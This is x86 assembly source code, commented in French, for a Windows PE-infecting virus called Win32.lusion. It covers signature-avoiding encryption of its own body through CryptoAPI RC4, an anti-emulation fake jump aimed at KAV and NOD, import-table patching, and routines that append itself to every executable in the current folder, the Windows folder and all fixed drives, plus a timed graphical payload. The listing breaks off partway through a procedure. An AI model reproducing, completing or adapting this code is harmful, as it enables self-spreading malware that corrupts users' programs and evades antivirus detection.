;----------------------------------------------------------------------------;
;FICHIER : main.asm                                                          ;
;NOM     : Win32.lusion                                                      ;
;DATE    : 07/09/2003                                                        ;
;VERSION : Beta                                                              ;
;AUTEUR  : kaze <kaze_0mx@yahoo.fr> <http://www.fat4ever.fr.st>              ;
;CIBLE   : PE                                                                ;
;OS      : Windows 95/98/Me/Xp/Nt/2000                                       ;
;TAILLE  : 4091 bytes (pas tres optimise non, mais la paylaod est grosse)    ;
;INFECT. : Ajoute une section.                                               ;
;RESID.  : Non                                                               ;
;CRYPT.  : Encrypt‚  via RC4 (CryptoAPIs) 100% api-based                     ;
;SEH     : Oui                                                               ;
;POLY.   : Si on veut, les chaines en clair sont deplacees a chaque gen.     ;
;ANTI*   : Fake jmp qui baise KAV et NOD.                                    ;
;AV-DET. : Pas detecte pour l'instant.                                       ; 
;SIGN.   : Peut-etre les chaines en fin de virus, bien qu'elles soient       ; 
;          deplacees a chaque generation.                                    ;
;PAYLOAD : 3d blured blobs. Environ 900 bytes                                ;
;DESC.   : Version beta de win32.lusion. Ce virus va infecter tous les PE du ;
;          rep courant, du rep windows, puis va lancer une tache qui         ;
;          infectera tous les disques. Le decrypteur est basé entierment sur ;
;          des apis, rendant sa detection plus ardue. Desassemblez un PE     ;
;          infecé et regardez l'EP: aucun [ebp+..] que des pushs et des calls;
;          Les chaines non encryptées sont déplacées régulierment pour eviter;
;          une signature.                                                    ;
;COMP    : tasm32 /ml /l /m3 main                                            ;
;          tlink32 /Tpe /aa  main ,,,import32.lib advapi32.lib               ;
;          makeex  main.exe (rend la section de code writeable)              ;
;BUGS    : Nop                                                               ;
;----------------------------------------------------------------------------;

PROV_RSA_FULL                   EQU 1
CRYPT_NEWKEYSET                 EQU 8
CRYPT_VERIFYCONTEXT             EQU 0F0000000h
CALG_RC4                        EQU 06801h
CALG_MD5                        EQU 08003h

MAX_FILES_PER_RUN               EQU 25
MAX_DIRS_PER_RUN                EQU 10
SLEEP_TIME_ON_INFECT_DIR        EQU 500  ;ms
ATTRIB_NORMAL                   EQU 080h
ATTRIB_DIR                      EQU 010h

.386p
.model flat,STDCALL

extrn GetProcAddress:PROC
extrn GetModuleHandleA:PROC
extrn MessageBoxA:PROC
extrn ExitProcess:PROC

call_ macro x
        call [ebp+x]
endm

callu macro                     ;opcode d'un call [xxxxxxxx]
        db 0FFh,15h
endm

pushd macro                     ;opcode d'un push xxxxxxxx
        db 068h
endm

pushu macro                     ;opcode d'un push [xxxxxxxx]
        db 0FFh,35h
endm

movu macro                      ;opcode d'un mov [xxxxxxxx],eax
        db 0A3h
endm

.data

db 'Win32.Ln coded by kaze/FAT'

;============================================================================
;                                   CODE
;============================================================================

.code
first_gen_start:
        jmp encrypted_stuff
start:
        


;============================================================================
;       DECRYPTEUR
;============================================================================

;        call CryptAcquireContextA, offset csp,0,0,PROV_RSA_FULL,0F0000000h
;        call CryptCreateHash, csp, CALG_MD5, 0, 0, offset hash
;        call CryptHashData, hash, offset t1, t1_len, 0
;        call CryptDeriveKey, csp, CALG_RC4, hash, 0, offset key
;        call CryptDecrypt, key, 0, 1, 0, offset buffer, offset buf_len

;obtient l'adresse de advapi32.dll
                pushd                   ;push offset advapi_name
adr_advapi      dd 0
                callu                   
gmha1           dd 0                    ;call LoadLibraryA
                mov ebx,eax

;obtient l'adresse de CryptAcquireContextA
                pushd
adr_cac         dd 0
                push ebx
                callu
gpa1            dd 0                    ;call GetProcAddress
                movu                    
adr_api1        dd 0                    ;mov api,eax

;crypt_aquire_context
                push CRYPT_VERIFYCONTEXT
                push PROV_RSA_FULL
                push 0
                push 0
                pushd                   ;push offset csp
adr_csp1        dd 0
                callu
adr_api2        dd 0                    ;call api <=> call CryptAcquireContextA

;obtient l'adresse de CryptCreateHash
                pushd
adr_cch         dd 0                    ;push offset CHash
                push ebx
                callu
gpa2            dd 0                    ;call GetProcAddress
                movu
adr_api3        dd 0                    ;mov api,eax

;crypt_create_hash
                pushd
adr_hash1       dd 0                    ;push offset hash
                push 0
                push 0
                push CALG_MD5
                pushu
adr_csp2        dd 0                    ;push csp
                callu
adr_api4        dd 0                    ;call api <=> call CryptCreateHash

;obtient l'adresse de CryptHashData
                pushd
adr_chd         dd 0                    ;push offset HData
                push ebx
                callu           
gpa3            dd 0                    ;call GetProcAddress
                movu
adr_api5        dd 0                    ;mov api,eax

;crypt_hash_data
                push 0
                push 32 ;len
                pushd
t1:
adr_t11         dd 0                    ;push offset t1
                pushu
adr_hash2       dd 0                    ;push hash
                callu
adr_api6        dd 0                    ;call api <=> call CryptHashData


;obtient l'adresse de CryptDeriveKey
                pushd
adr_cdk         dd 0                    ;push offset CDKey
                push ebx
                callu                   ;call GetProcAddress
gpa4            dd 0
                movu
adr_api7        dd 0                    ;mov api,eax

;crypt_derive_key
                pushd
adr_key1        dd 0                    ;push offset key
                push 0
                pushu
adr_hash3       dd 0                    ;push hash
                push CALG_RC4
                pushu
adr_csp3        dd 0                    ;push csp
                callu
adr_api8        dd 0                    ;call api <=> call CryptDeriveKey


;obtient l'adresse de CryptDecrypt
                pushd
adr_cd          dd 0                    ;push offset CDecrypt
                push ebx
                callu                   ;call GetProcAddress
gpa5            dd 0
                movu
adr_api9        dd 0                    ;mov api,eax

;crypt_decrypt
                xor eax,eax
                pushd
adr_len         dd 0                    ;push offset len
                pushd
adr_es          dd 0                    ;push offset encrypted_stuff
                push eax
                push 1
                push eax
                pushu
adr_key2        dd 0                    ;push key
                callu
adr_apiA        dd 0                    ;call api <=> call CryptDecrypt

;si l'api est mal ‚mul‚e, eax=0, sinon eax=1

                test eax,eax            ;fuck kav, cause kav believes eax=0
                jmp encrypted_stuff 

                db 0E9h
fake_ep_ret     dd 0                    ;fake jmp vers l'ancien ep
fake_jmp:

;============================================================================
;       CHOPPE LES APIS ET FAIT QQUES SAUVEGARDES
;============================================================================
encrypted_stuff:
                call delta
delta:          pop ebp
                sub ebp,offset delta

                lea ebx,[ebp+kernel_name]
                lea esi,[ebp+api2]
                mov ecx,NBR_APIS_KERNEL32
                lea edi,[ebp+ExitP]
                call ChercheApis                ;obtient les adresses des apis
                                                ;de kernel32.dll
                lea ebx,[ebp+user32_name]
                lea esi,[ebp+apiu1]
                mov ecx,NBR_APIS_USER32
                lea edi,[ebp+GDC]
                call ChercheApis                

                lea ebx,[ebp+gdi32_name]
                lea esi,[ebp+apig1]
                mov ecx,NBR_APIS_GDI32
                lea edi,[ebp+SDIBits]
                call ChercheApis                

                mov ecx,NBR_APIS_ADVAPI32
                call ChercheApis_advapi         ;obtient les adresses des apis
                                                ;d'advapi32.dll

                mov eax,[ebp+AncienEP]          ;sauvegarde qques donnees
                mov [ebp+saved_AncienEP],eax
                mov eax,[ebp+of_oldgmha_name]
                mov [ebp+saved_of_oldgmha_name],eax
                mov eax,[ebp+of_oldgpa_name]
                mov [ebp+saved_of_oldgpa_name],eax
                mov eax,[ebp+of_gmha]
                mov [ebp+saved_of_gmha1],eax
                mov eax,[ebp+of_gpa]
                mov [ebp+saved_of_gpa1],eax
                mov eax,[ebp+imagebase]
                mov [ebp+saved_imagebase],eax
                mov eax,[ebp+virusrva]
                mov [ebp+saved_virusrva],eax
                lea ebx,[ebp+kernel_name]
                mov eax,[ebp+of_gmha]
                push ebx
                call [eax]
                mov [ebp+adr_k32],eax
                
;========================== LANCEMENT DES THREADS ===========================

                lea esi,[ebp+infect_thread]
                call Make_thread

                lea ebx,[ebp+time_struc]
                push ebx
                call_ GLTime
                mov ax,[ebx+8]          ;payload si heure==minutes
                cmp ax,[ebx+10]
                jnz fin

                lea esi,[ebp+payload_thread]
                call Make_thread


;============================================================================
;       RETOUR A L'HOTE
;============================================================================

fin:
                test ebp,ebp
                jz premiere_gen_exit

                db 0BEh                 ;mov esi,...
saved_of_oldgmha_name dd 0
                db 0BFh                 ;mov edi ...
saved_of_gmha1  dd 0
                call restore_api        ;restaure l'IT

                db 0BFh                 ;mov edi ...
saved_of_gpa1   dd 0
                db 0BEh                 ;mov esi,...
saved_of_oldgpa_name  dd 0
                call restore_api        ;restaure l'IT

premiere_gen_exit:
                mov eax,[ebp+saved_imagebase]
                add eax,[ebp+saved_AncienEP]
                jmp eax                         ;Rend la main a l'hote



;============================================================================
;       THREAD D'INFECTION
;============================================================================

infect_thread:
                call delta2             ;ebp semble overwrit‚
delta2:         pop ebp
                sub ebp,offset delta2

;==================== INFECTION REP COURANT ET WINDOWS ======================

                call InfectRep          ;infecte le rep courant

                lea eax,[ebp+WFD_szFileName]
                push eax
                push 260
                push eax
                call_ GetWindowsDirectory
                call_ SetCurrentDirectory
                call InfectRep          ;infecte le rep windows


;==================== INFECTION DE TOUS LES DISQUES =========================

MegaLoop:                               ;infecte tous les disques
                lea ebx,[ebp+disque]
                inc byte ptr [ebx]
                push ebx
                call_ GDT               ; GetDriveType
                test eax,eax
                jz MegaLoop             ; Drive Type cannot be determinated
                dec eax
                jz MegaLoop             ; Root dir doesn't exist
                cmp al,3
                jae MegaLoop                    ; CDROM ou RamDisk
DiskOK:
                push ebx
                call_ SetCurrentDirectory       ; change de disque
                call InfectDisk
                jmp MegaLoop

InfectionTerminee:

                xor eax,eax
                push eax
                call_ EThread                   ; exit thread


InfectDisk proc near                    
                push ebx
                push dword ptr SLEEP_TIME_ON_INFECT_DIR
                call_ Sleep
                call InfectRep
ID_FF:
                lea esi,[ebp+WFD]
                lea eax,[ebp+dmask]             ; '*',0
                push esi
                push eax
                call_ FindFirstFile
                mov ebx,eax
                inc eax
                jmp ID_opt
ID_FN:          lea esi,[ebp+WFD]
                push ebx
                push esi
                push ebx
                call_ FindNextFile
                pop ebx
ID_opt:         test eax,eax
                jz ID_FNfin
                test [ebp+WFD_dwFileAttributes],dword ptr ATTRIB_DIR
                jz ID_FN
                cmp byte ptr [ebp+WFD_szFileName],'.'
                jz ID_FN
                lea esi,[ebp+WFD_szFileName]

                push ebx
                push esi
                call_ SetCurrentDirectory
                pop ebx
                call InfectDisk
                jmp ID_FN
ID_FNfin:
                push ebx
                call_ FindClose
                lea esi,[ebp+dotdot]
                push esi
                call_ SetCurrentDirectory
IDfin:          pop ebx
                ret
InfectDisk endp


;============================================================================
;       THREAD PAYLOAD
;============================================================================
Camera                  EQU 400
BLOB_LARGEUR            EQU 16                                    
BLOB_HAUTEUR            EQU 12
BLOB_COULEUR            EQU 255
PL_BACKGROUND_COLOR     EQU 0FFFFFFFFh
PL_LARGEUR              EQU 300
PL_HAUTEUR              EQU 300
PL_BPP                  EQU 1
PL_COULEURS             EQU 256

payload_thread:
                call delta3             ;ebp semble overwrit‚
delta3:         pop ebp
                sub ebp,offset delta3

                xor eax,eax
                push eax
                call_ GDC
                mov [ebp+hdc1],eax

                push PL_COULEURS*4+1024+40 + PL_LARGEUR*(PL_HAUTEUR+10)+1024  
                push 40h
                call_ LAlloc                    ;cr‚ation du bmp ....

                mov [ebp+bmp_header],eax
                mov edi,eax
                add eax,PL_COULEURS*4+1024
                mov [ebp+bmp_buffer],eax

                mov eax,40
                stosd
                mov eax,PL_LARGEUR
                stosd
                mov eax,PL_HAUTEUR
                stosd
                mov eax,00080001h
                stosd
                add edi,40-16

                xor eax,eax                     ;creation de la palette ...
                mov ecx,127
pal_loop1:
                stosd
                add eax,000000200h  
                loop pal_loop1          ;increment le rouge

        
                mov ecx,127
pal_loop3:
                stosd
                add eax,00020002h
                loop pal_loop3

;============================ GRAPHIK DEMO ==================================

SuperLoop:
                push 10
                call_ Sleep
ik:
                inc dword ptr [ebp+Zangle]
                inc dword ptr [ebp+Xangle]
                add dword ptr [ebp+Yangle],3
                call CalcAngles

                mov ecx,nbr_points-1
                lea edi,[ebp+points]
calcpoints:
                push ecx
                mov ebx,[edi]
                mov ecx,[edi+4]
                mov esi,[edi+8]
                push edi
                call rotate_x
                call rotate_y
                call rotate_z
                call Calc3dto2d
                add edi,[ebp+bmp_buffer]
                call Do_blob
                pop edi
                add edi,12
                pop ecx
                loop calcpoints

                call Blur
        
                xor ecx,ecx
                push 00CC0020h
                push ecx
                push [ebp+bmp_header]
                mov eax,[ebp+bmp_buffer]
                add eax,PL_LARGEUR*2
                push eax
                push PL_HAUTEUR
                push PL_LARGEUR
                push ecx
                push ecx
                push PL_HAUTEUR
                push PL_LARGEUR
                push ecx
                push ecx
                push [ebp+hdc1]
                call_ SDIBits

                push len_credits
                lea eax,[ebp+credits]
                push eax
                push PL_HAUTEUR
                push 35
                push [ebp+hdc1]
                call_ TOutA
                jmp SuperLoop


CalcAngles proc near
        mov ebx,[ebp+Zangle]
        call GetSinCos
        mov [ebp+Zcos],ebx
        mov [ebp+Zsin],eax
        mov ebx,[ebp+Yangle]
        call GetSinCos
        mov [ebp+Ycos],ebx
        mov [ebp+Ysin],eax
        mov ebx,[ebp+Xangle]
        call GetSinCos
        mov [ebp+Xcos],ebx
        mov [ebp+Xsin],eax
        ret
CalcAngles endp        


rotate_x proc near              ;in/out : ebx=x ecx=y esi=z
; newy= cos(a)*y-sin(a)*z
; newz= sin(a)*y+cos(a)*z
        mov eax,[ebp+Xcos]
        imul ecx
        mov edi,eax
        mov eax,[ebp+Xsin]
        imul esi
        sub edi,eax
        sar edi,7
        push edi                ;newy
        
        mov eax,[ebp+Xsin]
        imul ecx
        mov edi,eax
        mov eax,[ebp+Xcos]
        imul esi
        add edi,eax
        mov esi,edi
        sar esi,7              ;newz
        pop ecx                 ;newy
        ret
rotate_x endp

rotate_y proc near              ;in/out : ebx=x ecx=y esi=z
; newx= cos(a)*x+sin(a)*z
; newz= -sin(a)*x+cos(a)*z
        mov eax,[ebp+Ycos]
        imul ebx
        mov edi,eax
        mov eax,[ebp+Ysin]
        imul esi
        add edi,eax
        sar edi,7
        push edi
        
        mov eax,[ebp+Ycos]
        imul esi
        mov edi,eax
        mov eax,[ebp+Ysin]
        imul ebx
        sub edi,eax
        mov esi,edi
        sar esi,7
        pop ebx
        ret
rotate_y endp

rotate_z proc near              ;in/out : ebx=x ecx=y esi=z
; newx= cos(a)*x-sin(a)*y
; newy= sin(a)*x+cos(a)*y
        mov eax,[ebp+Zcos]
        imul ebx
        mov edi,eax
        mov eax,[ebp+Ysin]
        imul ecx
        sub edi,eax
        sar edi,7

        push edi                ;newx
        
        mov eax,[ebp+Zsin]
        imul ebx
        mov edi,eax
        mov eax,[ebp+Zcos]
        imul ecx
        add edi,eax
        mov ecx,edi
        sar ecx,7              ;newy
        pop ebx                 ;newx
        ret
rotate_z endp

Do_blob proc near       ;edi=offset
        pusha
        lea esi,[ebp+blob]
        mov edx,BLOB_HAUTEUR
db_y:   mov ebx,BLOB_LARGEUR/16
db_x1:  mov ecx,15
        lodsw
db_x2:  bt eax,ecx
        jnc db_opp
        mov [edi],byte ptr BLOB_COULEUR
db_opp: inc edi
        loop db_x2
        dec ebx
        jnz db_x1
        sub edi,(PL_LARGEUR+BLOB_LARGEUR)
        dec edx
        jnz db_y
        popa
        ret
Do_blob endp

GetSinCos proc near
; Needed : bx=angle (0..255)
; Returns: ax=Sin   bx=Cos
        push ecx
        and ebx,0FFh
        mov     al,[SinCos + ebp + ebx ]   ; Get sin
        cbw
        cwde
        mov ecx,eax
        add ebx,64
        and ebx,0FFh
        mov     al,[SinCos + ebp + ebx]   ; Get cos
        cbw
        cwde
        mov ebx,eax
        mov eax,ecx
        pop ecx
        ret        
GetSinCos ENDP 
Calc3dto2d proc near    ;IN: ebx=x  ecx=y  esi=z
                        ;OUT: edi=offset
        sub esi,300             ;evite les div0
        mov eax,Camera
        imul ebx
        idiv esi
        mov edi,eax
        add edi,PL_LARGEUR/2    ;recentre
        mov eax,Camera
        imul ecx
        idiv esi
        add eax,PL_HAUTEUR/2    ;idem
        imul eax,eax,PL_LARGEUR
        add edi,eax
        ret
Calc3dto2d endp     

Blur proc near
        pusha
        mov esi,[ebp+bmp_buffer]
        add esi,PL_LARGEUR*PL_HAUTEUR
        mov ecx,PL_LARGEUR*(PL_HAUTEUR-1)
feu:    movzx eax,byte ptr [esi+PL_LARGEUR]
        movzx ebx,byte ptr [esi+1]
        add eax,ebx
        mov bl,[esi-1]
        add eax,ebx
        mov bl,[esi-PL_LARGEUR]
        add eax,ebx
        shr eax,2
;        jz pty
        dec eax
pty:
        mov [esi],al
        dec esi
        loop feu
        popa
        ret
Blur endp


;============================================================================
;                                   FONCTIONS
;============================================================================



; INFECTE UN FICHIER OUVERT

InfectPE proc near                      ;eax-->fichier en ram

                push eax
                mov edx,[eax+3Ch]
                add edx,eax             ;edx-->PEHeader
                lea edi,[edx+18h]
                movzx ecx,word ptr [edx+14h]            ;SizeOfOptionalHeader
                add edi,ecx             ;esi-->sections
                movzx ebx,word ptr [edx+6]
                inc word ptr [edx+6]
                imul ebx,ebx,28h
                xor eax,eax
                add edi,ebx
                dec eax
                call r_range
                stosd
                call r_range
                stosd

                and [edx+0D0h],dword ptr 0      ;xp only
                mov dword ptr [edi],(virus_len + heap_len)+1000h
                mov esi,[edx+50h]               ;SizeOfImage
                mov [ebp+virusrva],esi
                mov [edi+4],esi                 ;VirtualAdress=SizeOfImage
                mov ecx,[edx+3ch]               ;file alignement

                push edx
                xor edx,edx
                mov eax,virus_len
                mov ebx,eax
                div ecx
                sub ecx,edx
                add ebx,ecx
                pop edx
                mov [edi+8],ebx                 ;file size
                mov eax,[ebp+WFD_nFileSizeLow]
                mov [edi+12],eax                ;file offset            
                mov [edi+1Ch],0F0000060h

                mov ecx,[edx+50h]               ;SizeOfIMage
                xchg [edx+28h],ecx
                mov [ebp+AncienEP],ecx

                pop edi                         ;edi=fileoffset
                add [edx+50h],dword ptr 3000h   ;virus_len+Heap_len

                call mix_table          ;"poly" les chaines decryptees

                mov eax,edi
                push edi

                lea edi,[edx+18h]
                movzx ecx,word ptr [edx+14h]    ;SizeOfOptionalHeader
                add edi,ecx                     ;esi-->sections
                mov esi,[edx+80h]               ;eax=RVA import table
                movzx ecx,word ptr [edx+6]
cherche_raw_import:
                cmp [edi+0Ch],esi               ;RVA section
                ja mauvaise_section
                mov ebx,[edi+8]                 ;Virtual Size section
                add ebx,[edi+0Ch]
                cmp ebx,esi
                ja raw_import_trouve
mauvaise_section:
                add edi,28h
                loop cherche_raw_import

raw_import_trouve:                              ;edi-->header de la section contenant l'IT
                mov [edi+24h],dword ptr 0F0000060h 
                                                ;Cette section doit etre writeable vu qu'on
                                                ;la modifiera avant de rendre la main au PE.
                mov ebx,[edi+0Ch]               ;RVA de la section
                sub esi,ebx                     ;esi=offset des imports ds la section
                add esi,[edi+14h]               ;ajoute le RawOffset
                add esi,eax                     ;ajoute le FileOffset. 
                                                ;esi=offset de l'I.T dans le fichier.
                mov [ebp+iidraw],esi
                mov ebx,[edx+80h]                ;ebx=[edx+80h] = RVA de l'I.T
                mov [ebp+iidrva],ebx
                mov edx,0Ch                        
                mov ecx,35                      ;cherche dans les 35 premiers IIDescriptors.
fk32:           mov edi,[esi+edx]               ;edi=RVA du nom du module (en ram donc)
                sub edi,ebx                     ;edi=offset du nom du module dans l'.IT
                add edi,esi                     ;edi=offset du nom du module dans le fichier.
                cmp [edi],'NREK'                ;est-ce le IIDescriptor de kernel32.dll ?
                jz k32f
                add edx,014h                    ;on passe à l'IIDescriptor suivant
                loop fk32
                jmp byebyeerror
k32f:           and dword ptr [esi+edx-8],0     ;on met le TimeDateStamp à 0.
                mov ecx,[esi+edx+4]             ;ecx=RVA du First Thunk
                sub ecx,ebx
                mov edi,esi                     ;edi=offset de l'I.T dans le fichier.
                add ecx,esi                     ;ecx=offset du First Thunk dans le fichier
                mov esi,[esi+edx-0Ch]           ;esi=RVA de l'OriginalFirstThunk
                sub esi,ebx
                add esi,edi                     ;esi=offset de l'OriginalFirstThunk dans le 
                                                ;fichier
                sub esi,4
                sub ecx,4
                
                call ch_api_skip_ordinals_only  ;fait pointer esi et ecx vers le premier
                                                ;ImageThunkData valide (i.e pas qu'un ordinal).

                mov eax,[ebp+table_name+20]
                sub eax,[ebp+imagebase]         ;eax=RVA de 0,0,'LoadLibraryA',0 dans le PE
                                                ;en train d'être infecté.
                xchg [esi],eax                  ;Remplace la RVA de 0,0,'CreateFileA',0
                                                ;par celle de 0,0,'LoadLibraryA',0
                push ecx
                sub ecx,[ebp+iidraw]
                add ecx,[ebp+iidrva]
                add ecx,[ebp+imagebase]         ;On fait passer ecx d'un offset dans le fichier
                                                ;à une RVA pour le PE en train d'être infecté.
                mov [ebp+of_gmha],ecx           ;future rva of FT.GetModulehandleA
                mov [ebp+gmha1],ecx
                mov [ebp+of_oldgmha_name],eax
                pop ecx

                call ch_api_skip_ordinals_only

                mov eax,[ebp+table_name+24]  ;idem pour le deuxieme import ..
                sub eax,[ebp+imagebase]
                xchg [esi],eax
                sub ecx,[ebp+iidraw]
                add ecx,[ebp+iidrva]
                add ecx,[ebp+imagebase]
                mov [ebp+of_gpa],ecx           ;rva of FT.GetProcAddress
                mov [ebp+gpa1],ecx
                mov [ebp+gpa2],ecx
                mov [ebp+gpa3],ecx
                mov [ebp+gpa4],ecx
                mov [ebp+gpa5],ecx
                mov [ebp+of_oldgpa_name],eax

;============================= FIX RVAS OF DECRYPTOR ========================

                mov ebx,[ebp+virusrva]
                add ebx,[ebp+imagebase]

                mov eax,[ebp+AncienEP]  ;on fait d'abord le faux jmp
                add eax,[ebp+imagebase]
                mov ecx,offset fake_jmp-offset start
                add ecx,ebx
                sub ecx,eax
                neg ecx
                mov [ebp+fake_ep_ret],ecx

                mov eax,offset csp-offset start  ;puis on fixe le reste
                add eax,ebx
                mov [ebp+adr_csp1],eax
                mov [ebp+adr_csp2],eax
                mov [ebp+adr_csp3],eax
                mov eax,offset hash-offset start
                add eax,ebx
                mov [ebp+adr_hash1],eax
                mov [ebp+adr_hash2],eax
                mov [ebp+adr_hash3],eax
                mov eax,offset t1-offset start
                add eax,ebx
                mov [ebp+adr_t11],eax
                mov eax,offset key-offset start
                add eax,ebx
                mov [ebp+adr_key1],eax
                mov [ebp+adr_key2],eax
                mov eax,offset encrypted_stuff-offset start
                add eax,ebx
                mov [ebp+adr_es],eax
                mov eax,offset len-offset start
                add eax,ebx
                mov [ebp+adr_len],eax
                mov eax,offset api-offset start
                add eax,ebx
                mov [ebp+adr_api1],eax
                mov [ebp+adr_api2],eax
                mov [ebp+adr_api3],eax
                mov [ebp+adr_api4],eax
                mov [ebp+adr_api5],eax
                mov [ebp+adr_api6],eax
                mov [ebp+adr_api7],eax
                mov [ebp+adr_api8],eax
                mov [ebp+adr_api9],eax
                mov [ebp+adr_apiA],eax

                lea esi,[ebp+table_name]  ;Met a jour les adresses des noms
                lodsd                     ;des apis dans le decrypteur.
                mov [ebp+adr_cac],eax     ;Vu que ces adresses changent sans
                lodsd                     ;cesse pour eviter une signature,
                mov [ebp+adr_cch],eax     ;elle sont stockees dans table_name
                lodsd
                mov [ebp+adr_chd],eax
                lodsd
                mov [ebp+adr_cdk],eax
                lodsd
                mov [ebp+adr_cd],eax
                lodsd
                lodsd
                lodsd
                mov [ebp+adr_advapi],eax



;============================== RECOPIE LE VIRUS ============================

                mov [ebp+len],encrypted_stuff_len 
                pop edi
                add edi,[ebp+WFD_nFileSizeLow]  ;pointe vers la fin du fichier=le virus
                lea esi,[ebp+start]
                push edi
                mov ecx,virus_len 
                rep movsb                       ;recopie le virus ....

;============================== CRYPTE LE VIRUS =============================
                xor ebx,ebx
                push CRYPT_VERIFYCONTEXT 
                push PROV_RSA_FULL
                push ebx
                push ebx
                lea eax,[ebp+offset csp]
                push eax
                call_ CAContext

                lea eax,[ebp+hash]
                push eax
                push ebx
                push ebx
                push CALG_MD5
                push [ebp+csp]
                call_ CCHash

                push ebx
                push 32 ;len
                lea eax,[ebp+t1]
                push eax
                push [ebp+hash]
                call_ CHData

                lea eax,[ebp+key]
                push eax
                push ebx
                push [ebp+hash]
                push CALG_RC4
                push [ebp+csp]
                call_ CDKey

                pop edi                         ;debut du virus sur le disque
                push encrypted_stuff_len
                lea eax,[ebp+len]
                push eax
                add edi,(offset encrypted_stuff-offset start)
                push edi
                push ebx
                inc ebx
                push ebx
                dec ebx
                push ebx
                push [ebp+key]
                call_ CEncrypt

                jmp byebye


error_chapi:    pop eax
byebyeerror:    pop edi
byebye:
                call restore_table_rvas              ;remt a jour les rvas
                ret

InfectPE endp

ch_api_skip_ordinals_only proc near     ;IN: esi --> debut OFT-4, ecx-->debut FT-4, ebx=decalage raw/rva
                add esi,4               ;OUT; esi--> OFT, ecx--> FT
                add ecx,4
                mov eax,[esi]
                test eax,eax                    ;derniere entree
                jz error_chapi
                sub eax,ebx
                add eax,edi                     ;edi--> RawOffset des imports
                cmp [esi+3],byte ptr 80h        ; juste un ordinal ?
                jz ch_api_skip_ordinals_only
                ret
ch_api_skip_ordinals_only endp

restore_api proc near           ;esi-->OFT et edi-->FT 
                add esi,[ebp+saved_imagebase]
                inc esi
                inc esi
                push esi
                push [ebp+adr_k32]
                call_ GPAddress
                stosd
                ret
restore_api endp

r_range proc near                       ; Ctrl-C Ctrl-V :]
                push ecx                        
                push edx
                mov ecx,eax
                mov eax, 214013h
                imul dword ptr [ebp+random]
                xor edx, edx
                add eax, 2531011h
                mov [ebp+random], eax
                xor edx,edx
                div ecx
                mov eax,edx
                pop edx
                pop ecx
                ret
r_range endp

Infection proc near     ;esi--> WFD
        push ecx
        push 080h
        push esi
        call_ SFA
        xor eax,eax
        push eax
        push eax
        push 3
        push eax
        inc eax
        push eax
        push 0C0000000h 
        push esi
        call_ CreateFile 
        inc eax
        jz peuxpas
        dec eax
        mov [ebp+Fhandle],eax

        mov edi,[ebp+WFD_nFileSizeLow]
        call CreateMappedFile
        test eax,eax
        jz mappas
        mov [ebp+Mhandle],eax
        call MapFile
        test eax,eax
        jz veuxpas
        mov [ebp+MapOff],eax
        mov esi,[eax+3Ch]
        cmp esi,edi
        jae pasbon                      ;si MZ, evite les violation de pages
        add esi,eax

;= Test si PE valide

        cmp dword ptr [esi],'EP'
        jnz pasbon

;= Test si le pe a deja ete infecte

        lea eax,[esi+18h]
        movzx ecx,word ptr [esi+14h]    ;SizeOfOptionalHeader
        add eax,ecx                     ;esi-->sections
        movzx edx,word ptr [esi+6]
        dec edx
        imul edx,edx,28h
        cmp [eax+edx],byte ptr '.'      ;si le nom de la derniere section
        jnz pasbon                      ;ne commence pas par '.', alors
                                        ;le pe doit etre infecte.
;= fermeture du fichier

        mov eax,[esi+34h]
        mov [ebp+imagebase],eax
        mov esi,[esi+3Ch]                 ;File Alignement
        mov [ebp+alignement],esi
        push [ebp+MapOff]
        call_ UMVOFile
        push [ebp+Mhandle]
        call_ CloseHandle

;= On le remap mais avec une taille plus grande

        xor edx,edx
        add edi,virus_len       ;edi=fichier+virus
        mov eax,edi
        div esi
        sub esi,edx
        add edi,esi             ;edi=tailletotale+(alignement-tailletotale%Alignement)
        mov [ebp+tailleajustee],edi
        call CreateMappedFile
        mov [ebp+Mhandle],eax
        call MapFile
        mov [ebp+MapOff],eax
        call InfectPE
pasbon: push [ebp+MapOff]
        call_ UMVOFile
veuxpas:push [ebp+Mhandle]
        call_ CloseHandle
mappas: push [ebp+Fhandle]
        call_ CloseHandle 
peuxpas:push [ebp+WFD_dwFileAttributes]
        lea eax,[ebp+WFD_szFileName]
        push eax
        call_ SFA
        pop ecx
        ret
Infection endp

InfectRep proc near
        lea esi,[ebp+WFD]
        lea eax,[ebp+mask]
        push esi
        push eax
        call_ FindFirstFile
        inc eax
        jz badrep
        dec eax
        mov [ebp+Shandle],eax
unautreverre?:
        lea esi,[ebp+WFD_szFileName]
        call Infection

        lea eax,[ebp+WFD]
        push eax
        push [ebp+Shandle]
        call_ FindNextFile
        test eax,eax            ;dernier fichier ?
        jnz unautreverre?
        push [ebp+Shandle]
        call_ FindClose
badrep: ret
InfectRep endp

MapFile         proc    ;edi=taille
        xor     eax,eax
        push    edi
        push    eax
        push    eax
        push    00000002h
        push    [ebp+Mhandle]
        call_    MVOFile
        ret
MapFile         endp

CreateMappedFile proc near      ;edi=taille
        xor eax,eax
        push eax
        push edi
        push eax
        push 00000004h
        push eax
        push [ebp+Fhandle]
        call_ CreateFileMapping
        ret
CreateMappedFile endp

Make_thread proc near           ;esi--> debut de la thread
        xor edx,edx
        lea eax,[ebp+Thread_I]
        push eax
        push edx
        lea eax,[ebp+Thread_P]
        push eax
        push esi
        push edx
        push edx
        call_ CThread
        ret
Make_thread endp


ChercheApis     proc near       ;ebx--> nom du dll esi&edi -->tableaux
                push ecx
                push esi
                push edi
                push ebx
                mov eax,[ebp+of_gmha]
                call [eax]
CA_retour_1:    pop edi
                pop esi 
                pop ecx
                mov ebx,eax
Chapis:         push ecx                
                push esi
                push ebx
                mov eax,[ebp+of_gpa]
                call [eax]
CA_retour_2:    pop ecx
                stosd
yy:             lodsb
                test al,al
                jnz yy
                loop Chapis
                ret
ChercheApis     endp

ChercheApis_advapi proc near  
                push [ebp+table_name+28]
                mov eax,[ebp+of_gmha]
                call [eax]
                mov ebx,eax
                lea esi,[ebp+Encrypt]
                push esi
                push ebx
                mov eax,[ebp+of_gpa]
                call [eax]
                lea edi,[ebp+CEncrypt]
                stosd                           ;cas … part pour CryptEncrypt

                lea esi,[ebp+table_name]
                mov ecx,5
Chapis_adv:     push ecx
                push dword ptr [esi]
                push ebx
                mov eax,[ebp+of_gpa]
                call [eax]
                pop ecx
                stosd
                add esi,4
                loop Chapis_adv
                ret
ChercheApis_advapi endp

mix_table proc near     ;Change l'orde des chaines de la partie decryptee
        pusha           ;pour eviter toute signature. Met a jour leur adresse
                        ;dans table_name en cons‚quence
a0:     lea esi,[ebp+poly_table]
        lea edi,[ebp+poly_table2]
        lea edx,[ebp+table_name]
        mov ecx,8
        push edx
        push esi
        push edi
a1:
